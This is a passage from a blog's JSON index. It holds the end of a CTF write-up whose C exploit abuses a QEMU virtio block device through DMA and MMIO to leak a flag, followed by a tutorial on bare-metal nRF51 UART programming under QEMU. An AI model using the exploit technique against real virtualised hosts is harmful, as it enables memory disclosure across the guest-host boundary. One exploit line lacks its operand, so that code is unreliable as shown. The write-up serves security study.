mmio_read32(void* addr){\n    return *(volatile uint32_t*)addr;\n}\n\nuint64_t mmio_read64(void* addr){\n    return *(volatile uint64_t*)addr;\n}\n\nvoid mmio_write8(void* addr, uint8_t val){\n    *(volatile uint8_t*)addr = val;\n}\n\nvoid mmio_write16(void* addr, uint16_t val){\n    *(volatile uint16_t*)addr = val;\n}\n\nvoid mmio_write32(void* addr, uint32_t val){\n    *(volatile uint32_t*)addr = val;\n}\n\nvoid mmio_write64(void* addr, uint64_t val){\n    *(volatile uint64_t*)addr = val;\n}\n\nvoid mb(){\n    asm volatile(\"mfence\":::\"memory\");\n}\n\nvoid init_virtio() {\n    int fd = open(\"/sys/devices/pci0000:00/0000:00:04.0/config\", O_RDONLY);\n    if(fd &lt; 0){\n        ERR(\"Open virtio config\");\n    }\n    struct virtio_pci_cap cap;\n    char* config = malloc(0x1000);\n    int bytes_read = read(fd, config, 0x1000);\n    if(bytes_read &lt; 0){\n        ERR(\"Read virtio config\");\n    }\n\n    fd = open(\"/sys/devices/pci0000:00/0000:00:04.0/resource4\", O_RDWR | O_SYNC);\n    if(fd &lt; 0){\n        ERR(\"Open virtio resource4\");\n    }\n    virtio_mmio = mmap(0, 0x4000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);\n    if(virtio_mmio == (volatile void*)-1){\n        ERR(\"mmap virtio mem\");\n    }\n    close(fd);\n\n    u8 cap_ptr = *(u8*)(config+0x34);\n    while(cap_ptr != 0){\n        if(config[cap_ptr] != 0x9){\n            cap_ptr = *(u8*)(config+cap_ptr+1);\n            continue;\n        }\n        memcpy(&amp;cap, config+cap_ptr, sizeof(cap));\n        print_cap(&amp;cap);\n        switch(cap.cfg_type){\n            case VIRTIO_PCI_CAP_COMMON_CFG:\n                virtio_common_mmio = virtio_mmio + cap.offset;\n                break;\n            case VIRTIO_PCI_CAP_NOTIFY_CFG:\n                virtio_notify_mmio = (struct virtio_notify_cfg*)((size_t)virtio_mmio + cap.offset);\n                break;\n            case VIRTIO_PCI_CAP_ISR_CFG:\n                virtio_isr_mmio = virtio_mmio + cap.offset;\n                break;\n            case VIRTIO_PCI_CAP_DEVICE_CFG:\n                virtio_device_mmio = virtio_mmio + cap.offset;\n                break;\n            default:\n                break;\n        }\n        cap_ptr = cap.cap_next;\n    }\n    close(fd);\n    free(config);\n\n    struct virtio_pci_common_cfg* common_cfg = (struct virtio_pci_common_cfg*)virtio_common_mmio;\n    mmio_write32(&amp;common_cfg-&gt;device_feature_select, 0);\n    printf(\"device_feature[0]: %x\\n\", mmio_read32(&amp;common_cfg-&gt;device_feature));\n    mmio_write32(&amp;common_cfg-&gt;device_feature_select, 1);\n    printf(\"device_feature[1]: %x\\n\", mmio_read32(&amp;common_cfg-&gt;device_feature));\n    mmio_write32(&amp;common_cfg-&gt;driver_feature_select, 0);\n    printf(\"driver_feature[0]: %x\\n\", mmio_read32(&amp;common_cfg-&gt;driver_feature));\n    mmio_write32(&amp;common_cfg-&gt;driver_feature_select, 1);\n    printf(\"driver_feature[1]: %x\\n\", mmio_read32(&amp;common_cfg-&gt;driver_feature));\n\n    struct virtio_blk_config* blk_cfg = (struct virtio_blk_config*)virtio_device_mmio;\n    printf(\"capacity: %lx\\n\", mmio_read64(&amp;blk_cfg-&gt;capacity));\n    printf(\"size_max: %x\\n\", mmio_read32(&amp;blk_cfg-&gt;size_max));\n    printf(\"seg_max: %x\\n\", mmio_read32(&amp;blk_cfg-&gt;seg_max));\n    printf(\"geometry.cylinders: %x\\n\", mmio_read16(&amp;blk_cfg-&gt;geometry.cylinders));\n    printf(\"geometry.heads: %x\\n\", mmio_read8(&amp;blk_cfg-&gt;geometry.heads));\n    printf(\"geometry.sectors: %x\\n\", mmio_read8(&amp;blk_cfg-&gt;geometry.sectors));\n    printf(\"blk_size: %x\\n\", mmio_read32(&amp;blk_cfg-&gt;blk_size));\n\n    // reset device\n    mmio_write8(&amp;common_cfg-&gt;device_status, 0);\n    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_ACKNOWLEDGE);\n    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_DRIVER | VIRTIO_CONFIG_S_ACKNOWLEDGE);\n    mmio_write32(&amp;common_cfg-&gt;driver_feature_select, 0);\n    mmio_write32(&amp;common_cfg-&gt;driver_feature, 0); // disable all features\n    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_FEATURES_OK | VIRTIO_CONFIG_S_DRIVER | VIRTIO_CONFIG_S_ACKNOWLEDGE);\n    assert(mmio_read8(&amp;common_cfg-&gt;device_status) &amp; VIRTIO_CONFIG_S_FEATURES_OK);\n\n\n    // alloc dma memory\n    int dma_fd = open(\"/dev/mem\", O_RDWR | O_SYNC);\n    if(dma_fd &lt; 0){\n        ERR(\"Open dma\");\n    }\n    dma_mem = mmap((void*)0x3ffdd000, 0x3000, PROT_READ | PROT_WRITE, MAP_SHARED, dma_fd, 0x3ffdd000);\n    if(dma_mem == (volatile void*)-1){\n        ERR(\"mmap dma mem\");\n    }\n    *(volatile uint32_t*)dma_mem = 0x12345678;\n    printf(\"%x\\n\", *(volatile uint32_t*)dma_mem);\n    *(volatile uint32_t*)dma_mem = 0;\n    printf(\"dma_mem: %p\\n\", dma_mem);\n    dma_data = dma_mem + 0x1000;\n    queue_desc = (struct virtq_desc*)dma_mem;\n    queue_avail = (struct virtq_avail*)((char*)queue_desc + 0x10 * VIRTIO_QUEUE_SIZE);\n    queue_used = (struct virtq_used*)((char*)dma_mem + 0x200);\n\n    // init queue\n    mmio_write16(&amp;common_cfg-&gt;queue_select, 0);\n    mmio_write16(&amp;common_cfg-&gt;queue_size, VIRTIO_QUEUE_SIZE);\n    mmio_write64(&amp;common_cfg-&gt;queue_desc, (size_t)0x3ffdd000);\n    mmio_write64(&amp;common_cfg-&gt;queue_driver, (size_t)0x3ffdd100);\n    mmio_write64(&amp;common_cfg-&gt;queue_device, (size_t)0x3ffdd200);\n    mmio_write16(&amp;common_cfg-&gt;queue_enable, 1);\n\n    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_DRIVER_OK | VIRTIO_CONFIG_S_FEATURES_OK | VIRTIO_CONFIG_S_DRIVER | VIRTIO_CONFIG_S_ACKNOWLEDGE);\n    puts(\"virtio init done\");\n}\n\nvoid spray(){\n    for(int i = 0xfff; i &gt; 0x28; i-=4){\n        mmio_write32((void*)readflag_mmio, i);\n    }\n}\n\nvoid hexdump(void* addr, size_t size){\n    // dump 4 bytes per time\n    for(int i = 0; i &lt; size; i+=4){\n        uint32_t val = *(volatile uint32_t*)(addr+i);\n        for(int j = 0; j &lt; 4; j++){\n            uint8_t chr = (val &gt;&gt; (j*8)) &amp; 0xff;\n            if(chr &gt;= 0x20 &amp;&amp; chr &lt;= 0x7e){\n                putchar(chr);\n            }else{\n                putchar('?');\n            }\n        }\n    }\n}\n\nint main(){\n    setbuf(stdout, NULL);\n    init_readflag();\n    init_virtio();\n\n    volatile struct virtio_blk_req* req = (struct virtio_blk_req*)dma_data;\n    req-&gt;type = 0xffffffffu;\n    req-&gt;sector = 0;\n    req-&gt;reserved = 0;\n\n    queue_desc[0].addr = (size_t)req;\n    queue_desc[0].len = 0x10;\n    queue_desc[0].flags = VIRTQ_DESC_F_NEXT;\n    queue_desc[0].next = 1;\n    queue_desc[1].addr = (size_t);\n    queue_desc[1].len = 0xfff;\n    queue_desc[1].flags = VIRTQ_DESC_F_WRITE | VIRTQ_DESC_F_NEXT;\n    queue_desc[1].next = 2;\n    queue_desc[2].addr = (size_t)dma_data + 0xa00;\n    queue_desc[2].len = 1;\n    queue_desc[2].flags = VIRTQ_DESC_F_WRITE;\n    queue_desc[2].next = 0;\n\n    queue_avail-&gt;flags = 1;\n    queue_avail-&gt;ring[0] = 0;\n    queue_avail-&gt;idx = 1;\n    mb();\n    mmio_write8((void*)virtio_isr_mmio, 1);\n    struct virtio_pci_common_cfg* common_cfg = (struct virtio_pci_common_cfg*)virtio_common_mmio;\n    void* notify_addr = (void*)((uintptr_t)virtio_notify_mmio + mmio_read32((void*)&amp;virtio_notify_mmio-&gt;cap.offset) + mmio_read16(&amp;common_cfg-&gt;queue_notify_off) * mmio_read32((void*)&amp;virtio_notify_mmio-&gt;notify_off_multiplier));\n    puts(\"--------------------------------\");\n    for(int i = 0; i &lt; 0x100; i+=4){\n        spray();\n    }\n    mmio_write16(notify_addr, 0);\n    puts(\"--------------------------------\");\n    hexdump((char*)virtio_common_mmio + 0x000, 0x100);\n\n    munmap(dma_mem, 0x3000);\n    munmap(virtio_mmio, 0x4000);\n    munmap(readflag_mmio, 0x1000);\n}\nReferences\n\n\n\nVirtual\nI/O Device (VIRTIO) Version 1.1↩︎\nVirtqueues\nand virtio ring: How the data travels↩︎\nMemory-mapped\nI/O and port-mapped I/O↩︎\n\n\n","categories":["CTF"],"tags":["pwn","qemu","virtio","dma"]},{"title":"ARM Bare metal try","url":"/categories/Pwn/Study/arm-bare-metal-helloworld/","content":"Foreword\n想给今年的 HGAME Mini\n2025 出一道简单的 Pwn 题，突然想着之前的题目似乎没有涉及到 IoT\nPwn 的（虽然可能是因为不太算 pwn 的入门内容？），打算来一道比较简单的，正好学习一下 IoT 的相关知识吧。\n\nChoose a Platform\nIoT 设备的 ISA 一般使用 ARM, RISC-V, MIPS。题目考虑使用 nRF51822 based on\nARM Cortex-M0 SoC, QEMU 对其有较好支持。\nqemu-system-arm \\\n  -M microbit \\\n  -cpu cortex-m0 \\\n  -nographic \\\n  -serial tcp:127.0.0.1:2333,server,telnet \\\n  -kernel main.elf \\\n  --gdb tcp::1234\nHello World\nTo communicate - UART1\nIn QEMU, a simulated serial port can serve as stdio.\nnRF51822 has one UART peripheral, we would use it to interact.\nFor convenience, using the official library nrfx to implement\nrelated functions, instead of defining addresses and operations by\nmyself.\nAlso, you can finish it with the manual.\n\n\nPin configuration\n\nHow to Transmit\n\n\nTransmission process\n\nnrfx defines a struct for parameters controlling uart.\ntypedef struct\n{\n    void                    * p_context;\n    nrfx_uart_event_handler_t handler;\n    uint8_t           const * p_tx_buffer;\n    uint8_t                 * p_rx_buffer;\n    uint8_t                 * p_rx_secondary_buffer;\n    volatile size_t           tx_buffer_length;\n    size_t                    rx_buffer_length;\n    size_t                    rx_secondary_buffer_length;\n    volatile size_t           tx_counter;\n    volatile size_t           rx_counter;\n    volatile bool             tx_abort;\n    bool                      rx_enabled;\n    nrfx_drv_state_t          state;\n    bool                      skip_gpio_cfg : 1;\n    bool                      skip_psel_cfg : 1;\n} uart_control_block_t;\nstatic uart_control_block_t m_cb[NRFX_UART_ENABLED_COUNT];\nnrfx_uart_tx() implenments this operation.\nnrfx_err_t nrfx_uart_tx(nrfx_uart_t const * p_instance,\n                        uint8_t const *     p_data,\n                        size_t              length)\n{\n    uart_control_block_t * p_cb = &amp;m_cb[p_instance-&gt;drv_inst_idx];\n\n    NRFX_ASSERT(p_cb-&gt;state == NRFX_DRV_STATE_INITIALIZED);\n    NRFX_ASSERT(p_data);\n    NRFX_ASSERT(length &gt; 0);\n\n    nrfx_err_t err_code;\n\n    if (nrfx_uart_tx_in_progress(p_instance))\n    {\n        err_code = NRFX_ERROR_BUSY;\n        NRFX_LOG_WARNING(\"Function: %s, error code: %s.\",\n                         __func__,\n                         NRFX_LOG_ERROR_STRING_GET(err_code));\n        return err_code;\n    }\n    p_cb-&gt;tx_buffer_length = length;\n    p_cb-&gt;p_tx_buffer      = p_data;\n    p_cb-&gt;tx_counter       = 0;\n    p_cb-&gt;tx_abort         = false;\n\n    NRFX_LOG_INFO(\"Transfer tx_len: %d.\", p_cb-&gt;tx_buffer_length);\n    NRFX_LOG_DEBUG(\"Tx data:\");\n    NRFX_LOG_HEXDUMP_DEBUG(p_cb-&gt;p_tx_buffer,\n                           p_cb-&gt;tx_buffer_length * sizeof(p_cb-&gt;p_tx_buffer[0]));\n\n    err_code = NRFX_SUCCESS;\n\n    nrf_uart_event_clear(p_instance-&gt;p_reg, NRF_UART_EVENT_TXDRDY);\n    nrf_uart_task_trigger(p_instance-&gt;p_reg, NRF_UART_TASK_STARTTX);\n\n    tx_byte(p_instance-&gt;p_reg, p_cb);\n\n    if (p_cb-&gt;handler == NULL)\n    {\n        if (!tx_blocking(p_instance-&gt;p_reg, p_cb))\n        {\n            // The transfer has been aborted.\n            err_code = NRFX_ERROR_FORBIDDEN;\n        }\n        else\n        {\n            // Wait until the last byte is completely transmitted.\n            while (!nrf_uart_event_check(p_instance-&gt;p_reg, NRF_UART_EVENT_TXDRDY))\n            {}\n            nrf_uart_task_trigger(p_instance-&gt;p_reg, NRF_UART_TASK_STOPTX);\n        }\n        p_cb-&gt;tx_buffer_length = 0;\n    }\n\n    NRFX_LOG_INFO(\"Function: %s, error code: %s.\", __func__, NRFX_LOG_ERROR_STRING_GET(err_code));\n    return err_code;\n}\nit calls tx_byte(),\nnrf_uart_txd_set()...\nstatic void tx_byte(NRF_UART_Type * p_uart, uart_control_block_t * p_cb)\n{\n    nrf_uart_event_clear(p_uart, NRF_UART_EVENT_TXDRDY);\n    uint8_t txd = p_cb-&gt;p_tx_buffer[p_cb-&gt;tx_counter];\n    p_cb-&gt;tx_counter++;\n    nrf_uart_txd_set(p_uart, txd);\n}\n\nNRF_STATIC_INLINE void nrf_uart_txd_set(NRF_UART_Type * p_reg, uint8_t txd)\n{\n    p_reg-&gt;TXD = txd;\n}\nBase and registers addresses were defined in nrf51.h.\ntypedef struct {                                /*!&lt; (@ 0x40002000) UART0 Structure                                            */\n  __OM  uint32_t  TASKS_STARTRX;                /*!&lt; (@ 0x00000000) Start UART receiver.                                       */\n  __OM  uint32_t  TASKS_STOPRX;                 /*!&lt; (@ 0x00000004) Stop UART receiver.                                        */\n  __OM  uint32_t  TASKS_STARTTX;                /*!&lt; (@ 0x00000008) Start UART transmitter.                                    */\n  __OM  uint32_t  TASKS_STOPTX;                 /*!&lt; (@ 0x0000000C) Stop UART transmitter.                                     */\n  __IM  uint32_t  RESERVED[3];\n  __OM  uint32_t  TASKS_SUSPEND;                /*!&lt; (@ 0x0000001C) Suspend UART.                                              */\n  __IM  uint32_t  RESERVED1[56];\n  __IOM uint32_t  EVENTS_CTS;                   /*!&lt; (@ 0x00000100) CTS activated.                                             */\n  __IOM uint32_t  EVENTS_NCTS;                  /*!&lt; (@ 0x00000104) CTS deactivated.                                           */\n  __IOM uint32_t  EVENTS_RXDRDY;                /*!&lt; (@ 0x00000108) Data received in RXD.                                      */\n  __IM  uint32_t  RESERVED2[4];\n  __IOM uint32_t  EVENTS_TXDRDY;                /*!&lt; (@ 0x0000011C) Data sent from TXD.                                        */\n  __IM  uint32_t  RESERVED3;\n  __IOM uint32_t  EVENTS_ERROR;                 /*!&lt; (@ 0x00000124) Error detected.                                            */\n  __IM  uint32_t  RESERVED4[7];\n  __IOM uint32_t  EVENTS_RXTO;                  /*!&lt; (@ 0x00000144) Receiver timeout.                                          */\n  __IM  uint32_t  RESERVED5[46];\n  __IOM uint32_t  SHORTS;                       /*!&lt; (@ 0x00000200) Shortcuts for UART.                                        */\n  __IM  uint32_t  RESERVED6[64];\n  __IOM uint32_t  INTENSET;                     /*!&lt; (@ 0x00000304) Interrupt enable set register.                             */\n  __IOM uint32_t  INTENCLR;                     /*!&lt; (@ 0x00000308) Interrupt enable clear register.                           */\n  __IM  uint32_t  RESERVED7[93];\n  __IOM uint32_t  ERRORSRC;                     /*!&lt; (@ 0x00000480) Error source. Write error field to 1 to clear\n                                                                    error.                                                     */\n  __IM  uint32_t  RESERVED8[31];\n  __IOM uint32_t  ENABLE;                       /*!&lt; (@ 0x00000500) Enable UART and acquire IOs.                               */\n  __IM  uint32_t  RESERVED9;\n  __IOM uint32_t  PSELRTS;                      /*!&lt; (@ 0x00000508) Pin select for RTS.                                        */\n  __IOM uint32_t  PSELTXD;                      /*!&lt; (@ 0x0000050C) Pin select for TXD.                                        */\n  __IOM uint32_t  PSELCTS;                      /*!&lt; (@ 0x00000510) Pin select for CTS.                                        */\n  __IOM uint32_t  PSELRXD;                      /*!&lt; (@ 0x00000514) Pin select for RXD.                                        */\n  __IM  uint32_t  RXD;                          /*!&lt; (@ 0x00000518) RXD register. On read action the buffer pointer\n                                                                    is displaced. Once read the character is\n                                                                    consumed. If read when no character available,\n                                                                    the UART will stop working.                                */\n  __OM  uint32_t  TXD;                          /*!&lt; (@ 0x0000051C) TXD register.                                              */\n  __IM  uint32_t  RESERVED10;\n  __IOM uint32_t  BAUDRATE;                     /*!&lt; (@ 0x00000524) UART Baudrate.                                             */\n  __IM  uint32_t  RESERVED11[17];\n  __IOM uint32_t  CONFIG;                       /*!&lt; (@ 0x0000056C) Configuration of parity and hardware flow control\n                                                                    register.                                                  */\n  __IM  uint32_t  RESERVED12[675];\n  __IOM uint32_t  POWER;                        /*!&lt; (@ 0x00000FFC) Peripheral power control.                                  */\n} NRF_UART_Type;                                /*!&lt; Size = 4096 (0x1000)                                                      */\nRun a helloworld.c\nInitialize\nBefore executing the program, we need to initialize memory space\nsatisfying the ARMv6-M architecture.2\nIncludes:\n​ Stack Definition, Heap Definition, Interrupt Vector Table, Reset\nHandler, Entry point and prepare .data,\n.bss.\nFor GCC compiler, the library provides a startup.S.\n/*\n \nCopyright (c) 2009-2025 ARM Limited. All rights reserved.\n\n    SPDX-License-Identifier: Apache-2.0\n\nLicensed under the Apache License, Version 2.0 (the License); you may\nnot use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an AS IS BASIS, WITHOUT\nWARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n\nNOTICE: This file has been modified by Nordic Semiconductor ASA.\n\n*/\n\n    .syntax unified\n    .arch armv6-m\n\n#ifdef __STARTUP_CONFIG\n#include \"startup_config.h\"\n#ifndef __STARTUP_CONFIG_STACK_ALIGNEMENT\n#define __STARTUP_CONFIG_STACK_ALIGNEMENT 3\n#endif\n#endif\n\n    .section .stack\n#if defined(__STARTUP_CONFIG)\n    .align __STARTUP_CONFIG_STACK_ALIGNEMENT\n    .equ    Stack_Size, __STARTUP_CONFIG_STACK_SIZE\n#elif defined(__STACK_SIZE)\n    .align 3\n    .equ    Stack_Size, __STACK_SIZE\n#else\n    .align 3\n    .equ    Stack_Size, 2048\n#endif\n    .globl __StackTop\n    .globl __StackLimit\n__StackLimit:\n    .space Stack_Size\n    .size __StackLimit, . - __StackLimit\n__StackTop:\n    .size __StackTop, . - __StackTop\n\n    .section .heap\n    .align 3\n#if defined(__STARTUP_CONFIG)\n    .equ Heap_Size, __STARTUP_CONFIG_HEAP_SIZE\n#elif defined(__HEAP_SIZE)\n    .equ Heap_Size, __HEAP_SIZE\n#else\n    .equ Heap_Size, 2048\n#endif\n    .globl __HeapBase\n    .globl __HeapLimit\n__HeapBase:\n    .if Heap_Size\n    .space Heap_Size\n    .endif\n    .size __HeapBase, . - __HeapBase\n__HeapLimit:\n    .size __HeapLimit, . - __HeapLimit\n\n    .section .isr_vector, \"ax\"\n    .align 2\n    .globl __isr_vector\n__isr_vector:\n    .long   __StackTop                  /* Top of Stack */\n    .long   Reset_Handler\n    .long   NMI_Handler\n    .long   HardFault_Handler\n    .long   0                           /*Reserved */\n    .long   0                           /*Reserved */\n    .long   0                           /*Reserved */\n    .long   0                           /*Reserved */\n    .long   0                           /*Reserved */\n    .long   0                           /*Reserved */\n    .long   0                           /*Reserved */\n    .long   SVC_Handler\n    .long   0                           /*Reserved */\n    .long   0                           /*Reserved */\n    .long   PendSV_Handler\n    .long   SysTick_Handler\n\n  /* External Interrupts */\n    .long   POWER_CLOCK_IRQHandler\n    .long   RADIO_IRQHandler\n    .long   UART0_IRQHandler\n    .long   SPI0_TWI0_IRQHandler\n    .long   SPI1_TWI1_IRQHandler\n    .long   0                           /*Reserved */\n    .long   GPIOTE_IRQHandler\n    .long   ADC_IRQHandler\n    .long   TIMER0_IRQHandler\n    .long   TIMER1_IRQHandler\n    .long   TIMER2_IRQHandler\n    .long   RTC0_IRQHandler\n    .long   TEMP_IRQHandler\n    .long   RNG_IRQHandler\n    .long   ECB_IRQHandler\n    .long   CCM_AAR_IRQHandler\n    .long   WDT_IRQHandler\n    .long   RTC1_IRQHandler\n    .long   QDEC_IRQHandler\n    .long   LPCOMP_IRQHandler\n    .long   SWI0_IRQHandler\n    .long   SWI1_IRQHandler\n    .long   SWI2_IRQHandler\n    .long   SWI3_IRQHandler\n    .long   SWI4_IRQHandler\n    .long   SWI5_IRQHandler\n    .long   0                           /*Reserved */\n    .long   0                           /*Reserved */\n    .long   0                           /*Reserved */\n    .long   0                           /*Reserved */\n    .long   0                           /*Reserved */\n    .long   0                           /*Reserved */\n\n    .size __isr_vector, . - __isr_vector\n\n/* Reset Handler */\n\n    .equ    NRF_POWER_RAMON_ADDRESS,             0x40000524\n    .equ    NRF_POWER_RAMONB_ADDRESS,            0x40000554\n    .equ    NRF_POWER_RAMONx_RAMxON_ONMODE_Msk,  0x3\n\n    .text\n    .thumb\n    .thumb_func\n    .align 1\n    .globl Reset_Handler\n    .type Reset_Handler, %function\nReset_Handler:\n\n    MOVS    R1, #NRF_POWER_RAMONx_RAMxON_ONMODE_Msk\n    \n    LDR     R0, =NRF_POWER_RAMON_ADDRESS\n    LDR     R2, [R0]\n    ORRS    R2, R1\n    STR     R2, [R0]\n\n    LDR     R0, =NRF_POWER_RAMONB_ADDRESS\n    LDR     R2, [R0]\n    ORRS    R2, R1\n    STR     R2, [R0]\n\n/* Loop to copy data from read only memory to RAM.\n * The ranges of copy from/to are specified by following symbols:\n *      __etext: LMA of start of the section to copy from. Usually end of text\n *      __data_start: VMA of start of the section to copy to.\n *      __data_end: VMA of end of the section to copy to. \n *\n * All addresses must be aligned to 4 bytes boundary.\n */\n#ifndef __STARTUP_SKIP_ETEXT\n\n/* Load .data */\n    ldr r1, =__data_start\n    ldr r2, =__data_end\n    ldr r3, =__data_load_start\n    bl copy_region\n\n/* Load .sdata */\n    ldr r1, =__sdata_start\n    ldr r2, =__sdata_end\n    ldr r3, =__sdata_load_start\n    bl copy_region\n\n/* Load .tdata */\n    ldr r1, =__tdata_start\n    ldr r2, =__tdata_end\n    ldr r3, =__tdata_load_start\n    bl copy_region\n\n/* Load .fast */\n    ldr r1, =__fast_start\n    ldr r2, =__fast_end\n    ldr r3, =__fast_load_start\n    bl copy_region\n\n    b copy_etext_done\n\n/* Method that loads data from nvm to ram */\ncopy_region:\n    subs r2, r2, r1\n    ble L_copy_region_done\n\nL_copy_region:\n    subs r2, r2, #4\n    ldr r0, [r3,r2]\n    str r0, [r1,r2]\n    bgt L_copy_region\n\nL_copy_region_done:\n\n    bx lr\n\ncopy_etext_done:\n\n\n#endif\n\n/* This part of work usually is done in C library startup code. Otherwise,\n * define __STARTUP_CLEAR_BSS to enable it in this startup. This section\n * clears the RAM where BSS data is located.\n *\n * The BSS section is specified by following symbols\n *    __bss_start__: start of the BSS section.\n *    __bss_end__: end of the BSS section.\n *\n * All addresses must be aligned to 4 bytes boundary.\n */\n#ifdef __STARTUP_CLEAR_BSS\n    ldr r1, =__bss_start__\n    ldr r2, =__bss_end__\n    bl clear_region\n\n    ldr r1, =__tbss_start__\n    ldr r2, =__tbss_end__\n    bl clear_region\n\n    ldr r1, =__sbss_start__\n    ldr r2, =__sbss_end__\n    bl clear_region\n\n    b clear_bss_done\n\n/* Method that clears default-0 registers */\nclear_region:\n    movs r0, 0\n\n    subs r2, r2, r1\n    ble .L_clear_region_done\n\n.L_clear_region:\n    subs r2, r2, #4\n    str r0, [r1, r2]\n    bgt .L_clear_region\n\n.L_clear_region_done:\n\n    bx lr\n\nclear_bss_done:\n\n#endif /* __STARTUP_CLEAR_BSS */\n\n/* Execute SystemInit function. */\n    bl SystemInit\n\n/* Call _start function provided by libraries.\n * If those libraries are not accessible, define __START as your entry point.\n */\n#ifndef __START\n#define __START _start\n#endif\n    bl __START\n\n    .pool\n    .size   Reset_Handler,.-Reset_Handler\n\n    .section \".text\"\n\n\n/* Dummy Exception Handlers (infinite loops which can be modified) */\n\n    .weak   NMI_Handler\n    .type   NMI_Handler, %function\nNMI_Handler:\n    b       .\n    .size   NMI_Handler, . - NMI_Handler\n\n\n    .weak   HardFault_Handler\n    .type   HardFault_Handler, %function\nHardFault_Handler:\n    b       .\n    .size   HardFault_Handler, . - HardFault_Handler\n\n\n    .weak   SVC_Handler\n    .type   SVC_Handler, %function\nSVC_Handler:\n    b       .\n    .size   SVC_Handler, . - SVC_Handler\n\n\n    .weak   PendSV_Handler\n    .type   PendSV_Handler, %function\nPendSV_Handler:\n    b       .\n    .size   PendSV_Handler, . - PendSV_Handler\n\n\n    .weak   SysTick_Handler\n    .type   SysTick_Handler, %function\nSysTick_Handler:\n    b       .\n    .size   SysTick_Handler, . - SysTick_Handler\n\n\n/* IRQ Handlers */\n\n    .globl  Default_Handler\n    .type   Default_Handler, %function\nDefault_Handler:\n    b       .\n    .size   Default_Handler, . - Default_Handler\n\n    .macro  IRQ handler\n    .weak   \\handler\n    .set    \\handler, Default_Handler\n    .endm\n\n    IRQ  POWER_CLOCK_IRQHandler\n    IRQ  RADIO_IRQHandler\n    IRQ  UART0_IRQHandler\n    IRQ  SPI0_TWI0_IRQHandler\n    IRQ  SPI1_TWI1_IRQHandler\n    IRQ  GPIOTE_IRQHandler\n    IRQ  ADC_IRQHandler\n    IRQ  TIMER0_IRQHandler\n    IRQ  TIMER1_IRQHandler\n    IRQ  TIMER2_IRQHandler\n    IRQ  RTC0_IRQHandler\n    IRQ  TEMP_IRQHandler\n    IRQ  RNG_IRQHandler\n    IRQ  ECB_IRQHandler\n    IRQ  CCM_AAR_IRQHandler\n    IRQ  WDT_IRQHandler\n    IRQ  RTC1_IRQHandler\n    IRQ  QDEC_IRQHandler\n    IRQ  LPCOMP_IRQHandler\n    IRQ  SWI0_IRQHandler\n    IRQ  SWI1_IRQHandler\n    IRQ  SWI2_IRQHandler\n    IRQ  SWI3_IRQHandler\n    IRQ  SWI4_IRQHandler\n    IRQ  SWI5_IRQHandler\n\n  .end\n\nAll the symbol above would be defined at a linker script(.ld).\nMakefile\nAfter everything prepared, use simply a makefile to complie.\nTARGET = main\n\nCC = arm-none-eabi-gcc\nOBJCOPY = arm-none-eabi-objcopy\n\nSRC = main.c \\\n      $(wildcard nrfx/drivers/src/*.c) \\\n      nrfx/mdk/gcc_startup_nrf51.S\n\nINCLUDES = -I. -Inrfx -Inrfx/mdk -Inrfx/hal -Inrfx/templates -Inrfx/drivers/include\n\nCFLAGS = -mcpu=cortex-m0 -mthumb -Wall -O0 -g -DNRF51 -DNRF51822_XXAA $(INCLUDES)\n\nLDFLAGS = -T nrf51822_xxaa.ld -nostartfiles\n\nOBJ := $(SRC:.c=.o)\nOBJ := $(OBJ:.S=.o)\n\nall: $(TARGET).elf\n\n%.o: %.c\n\t$(CC) $(CFLAGS) -c $&lt; -o $@\n\n%.o: %.S\n\t$(CC) $(CFLAGS) -c $&lt; -o $@\n\n$(TARGET).elf: $(OBJ)\n\t$(CC) $(CFLAGS) $(LDFLAGS) $^ -o $@\n\nbin: $(TARGET).elf\n\t$(OBJCOPY) -O binary $&lt; $(TARGET).bin\n\nclean:\n\trm -f $(OBJ) $(TARGET).elf $(TARGET).bin\nReferences\n\n\n\nNRF51_Series_Reference_Manual_v2.1.pdf↩︎\nArmv6-M\nArchitecture Reference Manual↩︎\n\n\n","categories":["Pwn","Study"],"tags":["QEMU","ARM","bare metal"]}]